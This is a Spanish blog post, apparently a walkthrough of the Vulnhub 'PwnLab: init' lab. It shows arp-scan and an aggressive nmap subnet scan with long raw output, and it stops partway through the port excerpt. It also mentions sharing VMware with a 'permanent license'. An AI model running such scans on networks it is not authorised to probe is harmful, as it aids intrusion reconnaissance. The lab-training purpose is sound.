---
layout: single
title: Vulnhub (PWNLAB)
excerpt: ""
date: 2023-07-23
classes: wide
header:
  teaser: /assets/images/20230725/Intro.jpg
  teaser_home_page: true
categories:
  - Hacking
  - Vulnhub
tags:
  - arp-scan
  - Nmap
  - Dirb
  - Nikto
  - LFI
  - Clickjacking
---

![](/assets/images/20230725/Intro.jpg)

Ir al sitio: [PWNLAB: INIT](https://www.vulnhub.com/entry/pwnlab-init,158/) para visualizar la máquina que vamos a trabajar hoy.

Aparecen 2 enlaces para la descarga de la máquina, en este momento voy a seleccionar la descarga directa; debido a que en ocasiones cuando se guardan archivos en proveedores de almacenamiento (en especial mega); algunos internautas reportan los links y los dan de baja, preferible intentar descarga directa y en caso de no funcionar, intentar el siguiente enlace:

```
https://download.vulnhub.com/pwnlab/pwnlab_init.ova
```

<center>
    <img src='./../assets/img/posts/20230702/Session_00.png'>
</center>

  <h2>Descripción</h2>

 Bienvenidos a "PwnLab: init". Está destinado a ser fácil, espero que lo disfrutes y tal vez aprendas algo. El propósito de este CTF es obtener root y leer la bandera (flag.txt).

- Dificultad: Baja
- Bandera: /root/flag.txt

### Información del archivo
- Nombre del archivo: pwnlab_init.ova
- Tamaño del archivo: 784 MB
- MD5: CE8AB26DE76E5883E67D6DE04C0F6E43
- SHA1: 575F19216A3FA3E377EFE69D5BF715913F294A3B

### Máquina virtual
- Formato: Máquina Virtual (Virtualbox - OVA)
- Sistema operativo: Debian

### Gestión de redes
- Servicio DHCP: Habilitado
- Dirección IP: asignar automáticamente

## Resumen

1. Descargar la máquina vulnerable.
2. Cargar la máquina en el emulador.
3. Localizar la IP de la máquina (Ifconfig, Nmap).
4. Escaneo de puertos (Nmap).
5. Escaneo de vulnerabilidades (Nikto).
6. Buscar vectores de ataques.
7. Explotar una vulnerabilidad conocida y obtener acceso al sistema.
8. Recomendaciones.

### Manos a la obra
Una vez descargada la máquina, tenemos que cargarla en el emulador, en este caso yo tengo *VMWare 16 Pro* (en otra ocasión subiré el archivo de instalación con una licencia permanente para su instalación, pero este no es el momento).

Esta máquina puede cargarse en *VMWare* o en *VirtualBox*.

<center>
    <img src='./../assets/img/posts/20230702/Session_01.png'>
</center>

Una vez cargada la máquina aparecerá el **login** al sistema:

<center>
    <img src='./../assets/img/posts/20230702/Session_02.png'>
</center>

Para realizar este tipo de máquinas utilizaré *Kali Linux*; pero puede utilizarse cualquier otra ISO, solo que tengas las herramientas necesarias, es todo lo que se pide.

Para buscar la IP de la máquina objetivo, existen 2 formas; la primera que probaremos será utilizar el comando **sudo arp-scan -l** y en seguida utilizamos **ifconfig**:

<center>
    <img src='./../assets/img/posts/20230702/Session_03.png'>
</center>

El comando **sudo arp-scan -l** funciona para localizar los hosts que están conectados a nuestra red local y el comando **ifconfig** funciona para mostrarnos cual es nuestra ip; la dirección IP de nuestra máquina vulnerable es *174.0.0.129*. Con este método sólo obtendremos la IP, pero si queremos obtener más información debemos ejecutar los siguientes comandos.

La siguiente forma de saber cual es la máquina objetivo es utilizar primero el comando **ifconfig** para verificar cual es nuestra IP y teniendo este dato podremos utilizar el comando **sudo nmap -Pn -sS -A -vvv 174.0.0.***

<center>
    <img src='./../assets/img/posts/20230702/Session_04.png'>
</center>

Más tarde se subirá un post completo de como funciona la herramienta *nmap*; por el momento se explicará las opciones que se utilizaron para este ejercicio: 

- **sudo** funciona para utilizar las herramientas con privilegios root
-  **nmap** llamamos a la herramienta
- **-Pn** No realiza ping en cada uno de los hosts escaneados
- **-sS** realiza un escaneo más rápido
- **-A** Escanea que tipo de sistema operativo está corriendo en cada host (escaneo agresivo)
- **-vvv** Aumenta la verbosidad del escaneo, es decir, muestra cada resultado que se obtiene del escaneo.
- **174.0.0.*** Funciona para escanear toda la red, en lugar de agregar el último octeto de la red, agregamos un asterisco (*) para señalar que se van a analizar todos los host

A continuación se muestra el resultado del escaneo:

```
┌──(al3j4ndr0㉿kali)-[~]
└─$ sudo nmap -Pn -sS -A -vvv 174.0.0.*
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-15 06:26 CST
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 06:26
Completed NSE at 06:26, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 06:26
Completed NSE at 06:26, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 06:26
Completed NSE at 06:26, 0.00s elapsed
Initiating ARP Ping Scan at 06:26
Scanning 255 hosts [1 port/host]
Completed ARP Ping Scan at 06:26, 1.92s elapsed (255 total hosts)
Initiating Parallel DNS resolution of 4 hosts. at 06:26
Completed Parallel DNS resolution of 4 hosts. at 06:26, 0.38s elapsed
DNS resolution of 4 IPs took 0.38s. Mode: Async [#: 1, OK: 2, NX: 2, DR: 0, SF: 0, TR: 4, CN: 0]
Nmap scan report for 174.0.0.0 [host down, received no-response]
Nmap scan report for 174.0.0.3 [host down, received no-response]
Nmap scan report for 174.0.0.4 [host down, received no-response]
Nmap scan report for 174.0.0.5 [host down, received no-response]
Nmap scan report for 174.0.0.6 [host down, received no-response]
Nmap scan report for 174.0.0.7 [host down, received no-response]
Nmap scan report for 174.0.0.8 [host down, received no-response]
Nmap scan report for 174.0.0.9 [host down, received no-response]
Nmap scan report for 174.0.0.10 [host down, received no-response]
Nmap scan report for 174.0.0.11 [host down, received no-response]
Nmap scan report for 174.0.0.12 [host down, received no-response]
Nmap scan report for 174.0.0.13 [host down, received no-response]
Nmap scan report for 174.0.0.14 [host down, received no-response]
Nmap scan report for 174.0.0.15 [host down, received no-response]
Nmap scan report for 174.0.0.16 [host down, received no-response]
Nmap scan report for 174.0.0.17 [host down, received no-response]
Nmap scan report for 174.0.0.18 [host down, received no-response]
Nmap scan report for 174.0.0.19 [host down, received no-response]
Nmap scan report for 174.0.0.20 [host down, received no-response]
Nmap scan report for 174.0.0.21 [host down, received no-response]
Nmap scan report for 174.0.0.22 [host down, received no-response]
Nmap scan report for 174.0.0.23 [host down, received no-response]
Nmap scan report for 174.0.0.24 [host down, received no-response]
Nmap scan report for 174.0.0.25 [host down, received no-response]
Nmap scan report for 174.0.0.26 [host down, received no-response]
Nmap scan report for 174.0.0.27 [host down, received no-response]
Nmap scan report for 174.0.0.28 [host down, received no-response]
Nmap scan report for 174.0.0.29 [host down, received no-response]
Nmap scan report for 174.0.0.30 [host down, received no-response]
Nmap scan report for 174.0.0.31 [host down, received no-response]
Nmap scan report for 174.0.0.32 [host down, received no-response]
Nmap scan report for 174.0.0.33 [host down, received no-response]
Nmap scan report for 174.0.0.34 [host down, received no-response]
Nmap scan report for 174.0.0.35 [host down, received no-response]
Nmap scan report for 174.0.0.36 [host down, received no-response]
Nmap scan report for 174.0.0.37 [host down, received no-response]
Nmap scan report for 174.0.0.38 [host down, received no-response]
Nmap scan report for 174.0.0.39 [host down, received no-response]
Nmap scan report for 174.0.0.40 [host down, received no-response]
Nmap scan report for 174.0.0.41 [host down, received no-response]
Nmap scan report for 174.0.0.42 [host down, received no-response]
Nmap scan report for 174.0.0.43 [host down, received no-response]
Nmap scan report for 174.0.0.44 [host down, received no-response]
Nmap scan report for 174.0.0.45 [host down, received no-response]
Nmap scan report for 174.0.0.46 [host down, received no-response]
Nmap scan report for 174.0.0.47 [host down, received no-response]
Nmap scan report for 174.0.0.48 [host down, received no-response]
Nmap scan report for 174.0.0.49 [host down, received no-response]
Nmap scan report for 174.0.0.50 [host down, received no-response]
Nmap scan report for 174.0.0.51 [host down, received no-response]
Nmap scan report for 174.0.0.52 [host down, received no-response]
Nmap scan report for 174.0.0.53 [host down, received no-response]
Nmap scan report for 174.0.0.54 [host down, received no-response]
Nmap scan report for 174.0.0.55 [host down, received no-response]
Nmap scan report for 174.0.0.56 [host down, received no-response]
Nmap scan report for 174.0.0.57 [host down, received no-response]
Nmap scan report for 174.0.0.58 [host down, received no-response]
Nmap scan report for 174.0.0.59 [host down, received no-response]
Nmap scan report for 174.0.0.60 [host down, received no-response]
Nmap scan report for 174.0.0.61 [host down, received no-response]
Nmap scan report for 174.0.0.62 [host down, received no-response]
Nmap scan report for 174.0.0.63 [host down, received no-response]
Nmap scan report for 174.0.0.64 [host down, received no-response]
Nmap scan report for 174.0.0.65 [host down, received no-response]
Nmap scan report for 174.0.0.66 [host down, received no-response]
Nmap scan report for 174.0.0.67 [host down, received no-response]
Nmap scan report for 174.0.0.68 [host down, received no-response]
Nmap scan report for 174.0.0.69 [host down, received no-response]
Nmap scan report for 174.0.0.70 [host down, received no-response]
Nmap scan report for 174.0.0.71 [host down, received no-response]
Nmap scan report for 174.0.0.72 [host down, received no-response]
Nmap scan report for 174.0.0.73 [host down, received no-response]
Nmap scan report for 174.0.0.74 [host down, received no-response]
Nmap scan report for 174.0.0.75 [host down, received no-response]
Nmap scan report for 174.0.0.76 [host down, received no-response]
Nmap scan report for 174.0.0.77 [host down, received no-response]
Nmap scan report for 174.0.0.78 [host down, received no-response]
Nmap scan report for 174.0.0.79 [host down, received no-response]
Nmap scan report for 174.0.0.80 [host down, received no-response]
Nmap scan report for 174.0.0.81 [host down, received no-response]
Nmap scan report for 174.0.0.82 [host down, received no-response]
Nmap scan report for 174.0.0.83 [host down, received no-response]
Nmap scan report for 174.0.0.84 [host down, received no-response]
Nmap scan report for 174.0.0.85 [host down, received no-response]
Nmap scan report for 174.0.0.86 [host down, received no-response]
Nmap scan report for 174.0.0.87 [host down, received no-response]
Nmap scan report for 174.0.0.88 [host down, received no-response]
Nmap scan report for 174.0.0.89 [host down, received no-response]
Nmap scan report for 174.0.0.90 [host down, received no-response]
Nmap scan report for 174.0.0.91 [host down, received no-response]
Nmap scan report for 174.0.0.92 [host down, received no-response]
Nmap scan report for 174.0.0.93 [host down, received no-response]
Nmap scan report for 174.0.0.94 [host down, received no-response]
Nmap scan report for 174.0.0.95 [host down, received no-response]
Nmap scan report for 174.0.0.96 [host down, received no-response]
Nmap scan report for 174.0.0.97 [host down, received no-response]
Nmap scan report for 174.0.0.98 [host down, received no-response]
Nmap scan report for 174.0.0.99 [host down, received no-response]
Nmap scan report for 174.0.0.100 [host down, received no-response]
Nmap scan report for 174.0.0.101 [host down, received no-response]
Nmap scan report for 174.0.0.102 [host down, received no-response]
Nmap scan report for 174.0.0.103 [host down, received no-response]
Nmap scan report for 174.0.0.104 [host down, received no-response]
Nmap scan report for 174.0.0.105 [host down, received no-response]
Nmap scan report for 174.0.0.106 [host down, received no-response]
Nmap scan report for 174.0.0.107 [host down, received no-response]
Nmap scan report for 174.0.0.108 [host down, received no-response]
Nmap scan report for 174.0.0.109 [host down, received no-response]
Nmap scan report for 174.0.0.110 [host down, received no-response]
Nmap scan report for 174.0.0.111 [host down, received no-response]
Nmap scan report for 174.0.0.112 [host down, received no-response]
Nmap scan report for 174.0.0.113 [host down, received no-response]
Nmap scan report for 174.0.0.114 [host down, received no-response]
Nmap scan report for 174.0.0.115 [host down, received no-response]
Nmap scan report for 174.0.0.116 [host down, received no-response]
Nmap scan report for 174.0.0.117 [host down, received no-response]
Nmap scan report for 174.0.0.118 [host down, received no-response]
Nmap scan report for 174.0.0.119 [host down, received no-response]
Nmap scan report for 174.0.0.120 [host down, received no-response]
Nmap scan report for 174.0.0.121 [host down, received no-response]
Nmap scan report for 174.0.0.122 [host down, received no-response]
Nmap scan report for 174.0.0.123 [host down, received no-response]
Nmap scan report for 174.0.0.124 [host down, received no-response]
Nmap scan report for 174.0.0.125 [host down, received no-response]
Nmap scan report for 174.0.0.126 [host down, received no-response]
Nmap scan report for 174.0.0.127 [host down, received no-response]
Nmap scan report for 174.0.0.130 [host down, received no-response]
Nmap scan report for 174.0.0.131 [host down, received no-response]
Nmap scan report for 174.0.0.132 [host down, received no-response]
Nmap scan report for 174.0.0.133 [host down, received no-response]
Nmap scan report for 174.0.0.134 [host down, received no-response]
Nmap scan report for 174.0.0.135 [host down, received no-response]
Nmap scan report for 174.0.0.136 [host down, received no-response]
Nmap scan report for 174.0.0.137 [host down, received no-response]
Nmap scan report for 174.0.0.138 [host down, received no-response]
Nmap scan report for 174.0.0.139 [host down, received no-response]
Nmap scan report for 174.0.0.140 [host down, received no-response]
Nmap scan report for 174.0.0.141 [host down, received no-response]
Nmap scan report for 174.0.0.142 [host down, received no-response]
Nmap scan report for 174.0.0.143 [host down, received no-response]
Nmap scan report for 174.0.0.144 [host down, received no-response]
Nmap scan report for 174.0.0.145 [host down, received no-response]
Nmap scan report for 174.0.0.146 [host down, received no-response]
Nmap scan report for 174.0.0.147 [host down, received no-response]
Nmap scan report for 174.0.0.148 [host down, received no-response]
Nmap scan report for 174.0.0.149 [host down, received no-response]
Nmap scan report for 174.0.0.150 [host down, received no-response]
Nmap scan report for 174.0.0.151 [host down, received no-response]
Nmap scan report for 174.0.0.152 [host down, received no-response]
Nmap scan report for 174.0.0.153 [host down, received no-response]
Nmap scan report for 174.0.0.154 [host down, received no-response]
Nmap scan report for 174.0.0.155 [host down, received no-response]
Nmap scan report for 174.0.0.156 [host down, received no-response]
Nmap scan report for 174.0.0.157 [host down, received no-response]
Nmap scan report for 174.0.0.158 [host down, received no-response]
Nmap scan report for 174.0.0.159 [host down, received no-response]
Nmap scan report for 174.0.0.160 [host down, received no-response]
Nmap scan report for 174.0.0.161 [host down, received no-response]
Nmap scan report for 174.0.0.162 [host down, received no-response]
Nmap scan report for 174.0.0.163 [host down, received no-response]
Nmap scan report for 174.0.0.164 [host down, received no-response]
Nmap scan report for 174.0.0.165 [host down, received no-response]
Nmap scan report for 174.0.0.166 [host down, received no-response]
Nmap scan report for 174.0.0.167 [host down, received no-response]
Nmap scan report for 174.0.0.168 [host down, received no-response]
Nmap scan report for 174.0.0.169 [host down, received no-response]
Nmap scan report for 174.0.0.170 [host down, received no-response]
Nmap scan report for 174.0.0.171 [host down, received no-response]
Nmap scan report for 174.0.0.172 [host down, received no-response]
Nmap scan report for 174.0.0.173 [host down, received no-response]
Nmap scan report for 174.0.0.174 [host down, received no-response]
Nmap scan report for 174.0.0.175 [host down, received no-response]
Nmap scan report for 174.0.0.176 [host down, received no-response]
Nmap scan report for 174.0.0.177 [host down, received no-response]
Nmap scan report for 174.0.0.178 [host down, received no-response]
Nmap scan report for 174.0.0.179 [host down, received no-response]
Nmap scan report for 174.0.0.180 [host down, received no-response]
Nmap scan report for 174.0.0.181 [host down, received no-response]
Nmap scan report for 174.0.0.182 [host down, received no-response]
Nmap scan report for 174.0.0.183 [host down, received no-response]
Nmap scan report for 174.0.0.184 [host down, received no-response]
Nmap scan report for 174.0.0.185 [host down, received no-response]
Nmap scan report for 174.0.0.186 [host down, received no-response]
Nmap scan report for 174.0.0.187 [host down, received no-response]
Nmap scan report for 174.0.0.188 [host down, received no-response]
Nmap scan report for 174.0.0.189 [host down, received no-response]
Nmap scan report for 174.0.0.190 [host down, received no-response]
Nmap scan report for 174.0.0.191 [host down, received no-response]
Nmap scan report for 174.0.0.192 [host down, received no-response]
Nmap scan report for 174.0.0.193 [host down, received no-response]
Nmap scan report for 174.0.0.194 [host down, received no-response]
Nmap scan report for 174.0.0.195 [host down, received no-response]
Nmap scan report for 174.0.0.196 [host down, received no-response]
Nmap scan report for 174.0.0.197 [host down, received no-response]
Nmap scan report for 174.0.0.198 [host down, received no-response]
Nmap scan report for 174.0.0.199 [host down, received no-response]
Nmap scan report for 174.0.0.200 [host down, received no-response]
Nmap scan report for 174.0.0.201 [host down, received no-response]
Nmap scan report for 174.0.0.202 [host down, received no-response]
Nmap scan report for 174.0.0.203 [host down, received no-response]
Nmap scan report for 174.0.0.204 [host down, received no-response]
Nmap scan report for 174.0.0.205 [host down, received no-response]
Nmap scan report for 174.0.0.206 [host down, received no-response]
Nmap scan report for 174.0.0.207 [host down, received no-response]
Nmap scan report for 174.0.0.208 [host down, received no-response]
Nmap scan report for 174.0.0.209 [host down, received no-response]
Nmap scan report for 174.0.0.210 [host down, received no-response]
Nmap scan report for 174.0.0.211 [host down, received no-response]
Nmap scan report for 174.0.0.212 [host down, received no-response]
Nmap scan report for 174.0.0.213 [host down, received no-response]
Nmap scan report for 174.0.0.214 [host down, received no-response]
Nmap scan report for 174.0.0.215 [host down, received no-response]
Nmap scan report for 174.0.0.216 [host down, received no-response]
Nmap scan report for 174.0.0.217 [host down, received no-response]
Nmap scan report for 174.0.0.218 [host down, received no-response]
Nmap scan report for 174.0.0.219 [host down, received no-response]
Nmap scan report for 174.0.0.220 [host down, received no-response]
Nmap scan report for 174.0.0.221 [host down, received no-response]
Nmap scan report for 174.0.0.222 [host down, received no-response]
Nmap scan report for 174.0.0.223 [host down, received no-response]
Nmap scan report for 174.0.0.224 [host down, received no-response]
Nmap scan report for 174.0.0.225 [host down, received no-response]
Nmap scan report for 174.0.0.226 [host down, received no-response]
Nmap scan report for 174.0.0.227 [host down, received no-response]
Nmap scan report for 174.0.0.228 [host down, received no-response]
Nmap scan report for 174.0.0.229 [host down, received no-response]
Nmap scan report for 174.0.0.230 [host down, received no-response]
Nmap scan report for 174.0.0.231 [host down, received no-response]
Nmap scan report for 174.0.0.232 [host down, received no-response]
Nmap scan report for 174.0.0.233 [host down, received no-response]
Nmap scan report for 174.0.0.234 [host down, received no-response]
Nmap scan report for 174.0.0.235 [host down, received no-response]
Nmap scan report for 174.0.0.236 [host down, received no-response]
Nmap scan report for 174.0.0.237 [host down, received no-response]
Nmap scan report for 174.0.0.238 [host down, received no-response]
Nmap scan report for 174.0.0.239 [host down, received no-response]
Nmap scan report for 174.0.0.240 [host down, received no-response]
Nmap scan report for 174.0.0.241 [host down, received no-response]
Nmap scan report for 174.0.0.242 [host down, received no-response]
Nmap scan report for 174.0.0.243 [host down, received no-response]
Nmap scan report for 174.0.0.244 [host down, received no-response]
Nmap scan report for 174.0.0.245 [host down, received no-response]
Nmap scan report for 174.0.0.246 [host down, received no-response]
Nmap scan report for 174.0.0.247 [host down, received no-response]
Nmap scan report for 174.0.0.248 [host down, received no-response]
Nmap scan report for 174.0.0.249 [host down, received no-response]
Nmap scan report for 174.0.0.250 [host down, received no-response]
Nmap scan report for 174.0.0.251 [host down, received no-response]
Nmap scan report for 174.0.0.252 [host down, received no-response]
Nmap scan report for 174.0.0.253 [host down, received no-response]
Nmap scan report for 174.0.0.255 [host down, received no-response]
Initiating Parallel DNS resolution of 1 host. at 06:26
Completed Parallel DNS resolution of 1 host. at 06:26, 0.14s elapsed
DNS resolution of 1 IPs took 0.14s. Mode: Async [#: 1, OK: 1, NX: 0, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating SYN Stealth Scan at 06:26
Scanning 4 hosts [1000 ports/host]
Discovered open port 3306/tcp on 174.0.0.129
Discovered open port 80/tcp on 174.0.0.129
Discovered open port 111/tcp on 174.0.0.129
Completed SYN Stealth Scan against 174.0.0.2 in 1.25s (3 hosts left)
Completed SYN Stealth Scan against 174.0.0.129 in 1.28s (2 hosts left)
Completed SYN Stealth Scan against 174.0.0.1 in 9.78s (1 host left)
Completed SYN Stealth Scan at 06:26, 9.78s elapsed (4000 total ports)
Initiating Service scan at 06:26
Scanning 3 services on 4 hosts
Completed Service scan at 06:26, 6.05s elapsed (3 services on 4 hosts)
Initiating OS detection (try #1) against 4 hosts
Retrying OS detection (try #2) against 2 hosts
NSE: Script scanning 4 hosts.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 06:26
Completed NSE at 06:26, 5.08s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 06:26
Completed NSE at 06:26, 0.08s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 06:26
Completed NSE at 06:26, 0.00s elapsed
Nmap scan report for 174.0.0.1
Host is up, received arp-response (0.00052s latency).
Scanned at 2023-07-15 06:26:31 CST for 24s
All 1000 scanned ports on 174.0.0.1 are in ignored states.
Not shown: 1000 filtered tcp ports (no-response)
MAC Address: 00:50:56:C0:00:02 (VMware)
Too many fingerprints match this host to give specific OS details
TCP/IP fingerprint:
SCAN(V=7.93%E=4%D=7/15%OT=%CT=%CU=%PV=N%DS=1%DC=D%G=N%M=005056%TM=64B2908F%P=x86_64-pc-linux-gnu)
U1(R=N)
IE(R=N)

Network Distance: 1 hop

TRACEROUTE
HOP RTT     ADDRESS
1   0.52 ms 174.0.0.1

Nmap scan report for s0106ac202ece4de3.cg.shawcable.net (174.0.0.2)
Host is up, received arp-response (0.00086s latency).
Scanned at 2023-07-15 06:26:31 CST for 24s
Not shown: 999 closed tcp ports (reset)
PORT   STATE    SERVICE REASON      VERSION
53/tcp filtered domain  no-response
MAC Address: 00:50:56:EA:8A:E1 (VMware)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: specialized
Running: VMware Player
OS CPE: cpe:/a:vmware:player
OS details: VMware Player virtual NAT device
TCP/IP fingerprint:
OS:SCAN(V=7.93%E=4%D=7/15%OT=%CT=1%CU=%PV=N%DS=1%DC=D%G=N%M=005056%TM=64B29
OS:08F%P=x86_64-pc-linux-gnu)SEQ(CI=I%II=I)T5(R=Y%DF=N%TG=80%W=7FFF%S=Z%A=S
OS:+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=N%TG=80%W=7FFF%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y
OS:%DF=N%TG=80%W=7FFF%S=Z%A=S%F=AR%O=%RD=0%Q=)U1(R=N)IE(R=Y%DFI=N%TG=80%CD=
OS:Z)

Network Distance: 1 hop

TRACEROUTE
HOP RTT     ADDRESS
1   0.86 ms s0106ac202ece4de3.cg.shawcable.net (174.0.0.2)

Nmap scan report for 174.0.0.129
Host is up, received arp-response (0.00074s latency).
Scanned at 2023-07-15 06:26:31 CST for 24s
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE REASON         VERSION
80/tcp   open  http    syn-ack ttl 64 Apache httpd 2.4.10 ((Debian))
|_http-title: PwnLab Intranet Image Hosting
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.10 (Debian)
111/tcp  open  rpcbind syn-ack ttl 64 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          45637/udp   status
|   100024  1          53525/tcp   status
|   100024  1          53879/udp6  status
|_  100024  1          58489/tcp6  status
3306/tcp open  mysql   syn-ack ttl 64 MySQL 5.5.47-0+deb8u1
| mysql-info: 
|   Protocol: 10
|   Version: 5.5.47-0+deb8u1
|   Thread ID: 39
|   Capabilities flags: 63487
|   Some Capabilities: Support41Auth, SupportsTransactions, Speaks41ProtocolNew, Speaks41ProtocolOld, FoundRows, InteractiveClient, SupportsLoadDataLocal, SupportsCompression, ConnectWithDatabase, IgnoreSigpipes, LongColumnFlag, IgnoreSpaceBeforeParenthesis, LongPassword, ODBCClient, DontAllowDatabaseTableColumn, SupportsAuthPlugins, SupportsMultipleStatments, SupportsMultipleResults
|   Status: Autocommit
|   Salt: _H'+BI(-IeD`99QlLv1-
|_  Auth Plugin Name: mysql_native_password
MAC Address: 00:0C:29:4C:1F:7E (VMware)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
TCP/IP fingerprint:
OS:SCAN(V=7.93%E=4%D=7/15%OT=80%CT=1%CU=32193%PV=N%DS=1%DC=D%G=Y%M=000C29%T
OS:M=64B2908F%P=x86_64-pc-linux-gnu)SEQ(SP=101%GCD=1%ISR=10D%TI=Z%CI=I%II=I
OS:%TS=8)OPS(O1=M5B4ST11NW7%O2=M5B4ST11NW7%O3=M5B4NNT11NW7%O4=M5B4ST11NW7%O
OS:5=M5B4ST11NW7%O6=M5B4ST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6
OS:=7120)ECN(R=Y%DF=Y%T=40%W=7210%O=M5B4NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O
OS:%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=
OS:0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%
OS:S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(
OS:R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=
OS:N%T=40%CD=S)

Uptime guess: 0.006 days (since Sat Jul 15 06:18:19 2023)
Network Distance: 1 hop
TCP Sequence Prediction: Difficulty=257 (Good luck!)
IP ID Sequence Generation: All zeros

TRACEROUTE
HOP RTT     ADDRESS
1   0.74 ms 174.0.0.129

Nmap scan report for s0106e0dbd1f7fc31.cg.shawcable.net (174.0.0.254)
Host is up, received arp-response (0.00020s latency).
Scanned at 2023-07-15 06:26:31 CST for 24s
All 1000 scanned ports on s0106e0dbd1f7fc31.cg.shawcable.net (174.0.0.254) are in ignored states.
Not shown: 1000 filtered tcp ports (no-response)
MAC Address: 00:50:56:F5:E2:38 (VMware)
Too many fingerprints match this host to give specific OS details
TCP/IP fingerprint:
SCAN(V=7.93%E=4%D=7/15%OT=%CT=%CU=%PV=N%DS=1%DC=D%G=N%M=005056%TM=64B2908F%P=x86_64-pc-linux-gnu)
U1(R=N)
IE(R=N)

Network Distance: 1 hop

TRACEROUTE
HOP RTT     ADDRESS
1   0.20 ms s0106e0dbd1f7fc31.cg.shawcable.net (174.0.0.254)

Initiating SYN Stealth Scan at 06:26
Scanning s0106606c634e2b63.cg.shawcable.net (174.0.0.128) [1000 ports]
Completed SYN Stealth Scan at 06:26, 0.05s elapsed (1000 total ports)
Initiating Service scan at 06:26
Initiating OS detection (try #1) against s0106606c634e2b63.cg.shawcable.net (174.0.0.128)
Retrying OS detection (try #2) against s0106606c634e2b63.cg.shawcable.net (174.0.0.128)
NSE: Script scanning 174.0.0.128.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 06:26
Completed NSE at 06:26, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 06:26
Completed NSE at 06:26, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 06:26
Completed NSE at 06:26, 0.00s elapsed
Nmap scan report for s0106606c634e2b63.cg.shawcable.net (174.0.0.128)
Host is up, received user-set (0.000061s latency).
Scanned at 2023-07-15 06:26:55 CST for 2s
All 1000 scanned ports on s0106606c634e2b63.cg.shawcable.net (174.0.0.128) are in ignored states.
Not shown: 1000 closed tcp ports (reset)
Too many fingerprints match this host to give specific OS details
TCP/IP fingerprint:
SCAN(V=7.93%E=4%D=7/15%OT=%CT=1%CU=39537%PV=N%DS=0%DC=L%G=N%TM=64B29091%P=x86_64-pc-linux-gnu)
SEQ(CI=Z%II=I)
T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)
IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 0 hops

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 06:26
Completed NSE at 06:26, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 06:26
Completed NSE at 06:26, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 06:26
Completed NSE at 06:26, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 256 IP addresses (5 hosts up) scanned in 29.55 seconds
           Raw packets sent: 7667 (341.664KB) | Rcvd: 4057 (168.856KB)
```

Como se menciona anteriormente por la opción **-vvv** se muestra cada resultado obtenido, es por ello que se hace demasiado extenso el escaneo, sin embargo, el fragmento de escaneo que buscamos es el siguiente:

```
Nmap scan report for 174.0.0.129
Host is up, received arp-response (0.00074s latency).
Scanned at 2023-07-15 06:26:31 CST for 24s
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE REASON         VERSION
80/tcp   open  http    syn-ack ttl 64 Apache httpd 2.4.10 ((Debian))
|_http-title: PwnLab Intranet Image Hosting
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.10 (Debian)
111/tcp  open  rpcbind syn-ack ttl 64 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          45637/udp   status
|   100024  1          53525/tcp   status
|   100024  1          53879/udp6  status
|_  100024  1          58489/tcp6  status
3306/tcp open  mysql   syn-ack ttl 64 MySQL 5.5.47-0+deb8u1
| mysql-info: 
|   Protocol: 10
|   Version: 5.5.47-0+deb8u1
|   Thread ID: 39
|   Capabilities flags: 63487
